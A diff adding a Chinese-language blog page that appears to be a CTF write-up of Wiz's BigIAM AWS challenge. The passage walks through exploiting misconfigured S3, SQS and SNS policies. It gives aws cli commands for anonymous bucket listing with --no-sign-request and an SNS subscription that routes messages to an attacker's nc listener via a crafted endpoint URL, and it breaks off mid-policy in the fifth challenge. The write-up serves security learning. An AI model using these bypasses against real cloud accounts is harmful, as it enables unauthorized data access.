@@ -1,0 +1,591 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="BigCircle">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="wiz BigIAM CTF 挑战赛地址一共六道题，都是给出IAM policy让你获取flag的形式，网页底部会提供一个终端，可以在该终端中运行aws cli Buckets of Fun第一题的policy如下： 12345678910111213141516171819202122&amp;#123;    &quot;Version&quot;: &quot;2012-10-17&quot;,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BIGIAM CTF writeup">
+<meta property="og:url" content="http://example.com/cllaoz36x0001rcutd3319fgg/index.html">
+<meta property="og:site_name" content="BigCircle-sec&#39;s Blog">
+<meta property="og:description" content="wiz BigIAM CTF 挑战赛地址一共六道题，都是给出IAM policy让你获取flag的形式，网页底部会提供一个终端，可以在该终端中运行aws cli Buckets of Fun第一题的policy如下： 12345678910111213141516171819202122&amp;#123;    &quot;Version&quot;: &quot;2012-10-17&quot;,">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-1.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-2.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-3.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-4.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-5.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-6.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-7.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-a.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-8.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-9.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-10.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-11.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-12.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-b.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-13.png">
+<meta property="article:published_time" content="2023-08-13T17:14:07.873Z">
+<meta property="article:modified_time" content="2023-08-14T09:41:00.275Z">
+<meta property="article:author" content="BigCircle">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-1.png">
+  
+  
+  
+  <title>BIGIAM CTF writeup - BigCircle-sec&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>BigCircle-sec&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="BIGIAM CTF writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.3k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          70 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">BIGIAM CTF writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><a target="_blank" rel="noopener" href="https://bigiamchallenge.com/challenge/1">wiz BigIAM CTF 挑战赛地址</a><br>一共六道题，都是给出IAM policy让你获取flag的形式，网页底部会提供一个终端，可以在该终端中运行aws cli</p>
+<h2 id="Buckets-of-Fun"><a href="#Buckets-of-Fun" class="headerlink" title="Buckets of Fun"></a>Buckets of Fun</h2><p>第一题的policy如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:GetObject&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:ListBucket&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;StringLike&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;s3:prefix&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;files/*&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<p>第一条权限语句表示允许所有人获取thebigiamchallenge-storage-9979f4b这个S3下的文件，第二条权限语句表示允许所有人列出thebigiamchallenge-storage-9979f4b这个S3下files下的文件列表。也就是说在该policy下，一个匿名用户可以知道thebigiamchallenge-storage-9979f4b这个S3下的files bucket有哪些文件并且可以读取其内容。<br>分析完policy，我们首先列出files下的所有文件<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-1.png" srcset="/img/loading.gif" lazyload><br>此时，我们发现files下有一个flag1.txt，很明显flag就存放在这里。由于我们有GetObject的权限，所以我们直接访问即可拿到flag<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-2.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Google-Analytics"><a href="#Google-Analytics" class="headerlink" title="Google Analytics"></a>Google Analytics</h2><p>第二题的policy如下</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;sqs:SendMessage&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;sqs:ReceiveMessage&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<p>通过该policy我们可以知道，此时我们拥有对<code>wiz-tbic-analytics-sqs-queue-ca7a1b2</code>这个sqs的发送信息和接受信息的权限。<br><strong>关于sqs：</strong><br>Amazon SQS是一个适用于微服务、分布式系统和无服务器应用程序的完全托管的消息队列，借助 Amazon Simple Queue Service（SQS），您可以在软件组件之间发送、存储和接收任何规模的消息，而不会丢失消息，并且无需其他服务即可保持可用。<br>所以猜测该题可能是通过sqs的ReceiveMessage权限收取信息，信息中应该会有flag。经过查阅<a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/zh_cn/cli/latest/reference/sqs/receive-message.html">sqs Receive文档</a>使用aws cli接收消息：<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-3.png" srcset="/img/loading.gif" lazyload><br>在消息中有一个url，访问该url即可获得flag<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-4.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Enable-Push-Notifications"><a href="#Enable-Push-Notifications" class="headerlink" title="Enable Push Notifications"></a>Enable Push Notifications</h2><p>第三题的policy如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2008-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Statement1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Sid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Statement1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;AWS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;SNS:Subscribe&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;StringLike&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;sns:Endpoint&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*@tbic.wiz.io&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<p>这条policy表示所有以@tbic.wiz.io为结尾的sns终端节点都有权限订阅名为<code>TBICWizPushNotifications</code>的sns<br><strong>关于sns：</strong><br>Amazon Simple Notification Service (Amazon SNS) 是一项托管服务，提供从发布者向订阅者（也称为创建者和使用者）的消息传输。发布者通过将消息发送至主题与订阅者进行异步交流，主题是一个逻辑访问点和通信渠道。客户端可以订阅 SNS 主题并使用受支持的终端节点类型接收已发布的消息，例如 Amazon Kinesis Data Firehose、Amazon SQS、AWS Lambda、HTTP、电子邮件、移动推送通知和移动短信 (SMS)。<br>通过查阅<a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html">sns订阅aws cli官方文档</a>，我们发现， 订阅sns时aws cli需要指明以下几个参数</p>
+<ul>
+<li>–notification-endpoint 指明终端节点</li>
+<li>–protocol 指明订阅后消息传输的协议</li>
+<li>–topic-arn sns的arn信息</li>
+</ul>
+<p>topic-arn在题目中已经给出。当protocol为http或https时，终端节点是以http(s):&#x2F;&#x2F;开头的url，这样我们就可以指定使用http协议并且将终端节点设置为<a href="http://ip:port/@tbic.wiz.io的形式，这样就可以绕过policy的限制。">http://ip:port/@tbic.wiz.io的形式，这样就可以绕过policy的限制。</a><br>首先在一台有公网ip的机器上使用nc监听端口,之后使用aws cli执行下面的命令订阅sns</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol http --notification-endpoint http://xxx.xxx.xxx.xxxx:xxx/@tbic.wiz.io<br></code></pre></td></tr></table></figure>
+<p>之后服务器上会接受到如下的消息：<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-5.png" srcset="/img/loading.gif" lazyload><br>由于我们采用的是http协议并且和sns所属的账号不是一个账号，所以还需要进行一步确认订阅的操作,确认订阅可直接访问上图中的SubscribeURL或者使用如下aws cli命令即可，其中token为上图中的token值</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">aws sns confirm-subscription --topic-arn arn:xxxxxx --token xxxx<br></code></pre></td></tr></table></figure>
+<p>确认订阅后监听的端口会返回flag<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-6.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Admin-only"><a href="#Admin-only" class="headerlink" title="Admin only?"></a>Admin only?</h2><p>该题的policy如下</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:GetObject&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:ListBucket&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;StringLike&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;s3:prefix&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;files/*&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;ForAllValues:StringLike&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;aws:PrincipalArn&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:iam::133713371337:user/admin&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<p>可以看到还是一个S3的policy。相比于第一题多了一个限制，只有aws:PrincipalArn为arn:aws:iam::133713371337:user&#x2F;admin时才可以使用ListBucket操作。这样第一题的操作就行不通了，我们需要绕过这个aws:PrincipalArn。通过查阅<a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_multi-value-conditions.html#reference_policies_multi-key-or-value-conditions">创建具有多个键或值的条件</a> 我们可以得知使用 ForAllValues 条件运算符时，如果请求中没有键或者键值解析为空数据集（如空字符串），则返回 true。如需要求该请求至少包含一个值，则您必须在策略中使用另一个条件。<br>所以我们只需要让aws:PrincipalArn为空即可，这里有两种方式，一是直接通过网页访问s3，二是使用aws cli 并且指定–no-sign-request。这里使用第二种方法进行测试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request<br></code></pre></td></tr></table></figure>
+<p><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-7.png" srcset="/img/loading.gif" lazyload><br>成功绕过，后续步骤和第一题差不多，直接获取flag-as-admin.txt的值即可<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-a.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Do-I-know-you"><a href="#Do-I-know-you" class="headerlink" title="Do I know you?"></a>Do I know you?</h2><p>该题的policy为：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Sid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;VisualEditor0&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;mobileanalytics:PutEvents&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;cognito-sync:*&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Sid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;VisualEditor1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;s3:GetObject&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;s3:ListBucket&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;arn:aws:s3:::wiz-privatefiles&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;arn:aws:s3:::wiz-privatefiles/*&quot;</span><br>            <span class="hljs-punctuation">]</span><br>        <span 